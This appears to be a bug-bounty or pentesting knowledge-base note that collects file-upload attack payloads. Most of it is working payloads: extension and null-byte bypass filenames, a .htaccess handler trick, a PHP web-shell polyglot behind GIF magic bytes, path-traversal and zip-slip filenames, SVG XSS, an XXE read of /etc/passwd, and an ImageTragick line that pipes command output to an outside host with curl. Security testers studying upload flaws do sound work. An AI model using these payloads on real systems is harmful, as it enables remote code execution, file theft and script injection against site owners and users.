---
title: "Payloads: File Upload"
type: payloads
tags: [payloads, file-upload, rce, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-07-21
---

# Payloads: File Upload

Extension / content-type / magic-byte / path bypasses to web-shell RCE, plus SVG/XXE and archive tricks. Routed via the `hunt-upload` skill. See [[techniques/web/file-upload]].

## Extension bypass
```
shell.php  .phtml .php3 .php4 .php5 .php7 .phar .pht .phpt .pgif .inc .shtml
shell.pHp  shell.PHP             (case)
shell.php.jpg   shell.jpg.php    (double)
shell.php%00.jpg  shell.php\x00.jpg   (null byte - old stacks)
shell.php;.jpg   shell.php:.jpg  shell.php/  shell.php....   (trailing/special)
shell.php%20  shell.php.         (trailing space/dot - Windows trims)
.jsp .jspx .jsw .jsv .war (Java)   .asp .aspx .asa .cer .asmx (IIS)
```

## Config-file uploads (turn a benign upload into exec)
```apache
# .htaccess (Apache) - then upload a .gif containing PHP
AddType application/x-httpd-php .gif
```
```xml
<!-- web.config (IIS) - enable ASP/script in the upload dir -->
<configuration><system.webServer><handlers>...</handlers></system.webServer></configuration>
```

## Content-Type / magic-byte bypass
```
Content-Type: image/png            (lie in the multipart part)
GIF89a;<?php system($_GET['c']); ?>           # GIF magic + PHP polyglot
\xFF\xD8\xFF\xE0 <?php ... ?>                  # JPEG magic
%PDF-1.4 <?php ... ?>                          # PDF magic
```

## Path traversal in filename (escape the upload dir / overwrite)
```
filename="../../../../var/www/html/shell.php"
filename="..%2f..%2fshell.php"
filename="....//....//shell.php"
```

## SVG / XML (stored XSS + XXE)
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><svg>...&e;...</svg>
```

## Archive tricks
```
zip-slip: entry name "../../../../var/www/html/shell.php" inside the uploaded zip
symlink in tar/zip -> read host files on extract
```

## Image-processing RCE
```
ImageTragick (ImageMagick CVE-2016-3714):  push graphic-context ... "|curl http://oob/`id`"
pixel-flood / decompression-bomb -> DoS
EXIF payload executed by a downstream parser
```

## Confirm
```
GET /uploads/shell.php?c=id        # execute, or OOB callback if blind
```

## Real-world
Extension + magic-byte bypass to web shell is a top RCE bug-bounty class; `.htaccess`/`web.config` upload, SVG stored XSS, and ImageTragick are recurring real CVEs/reports.
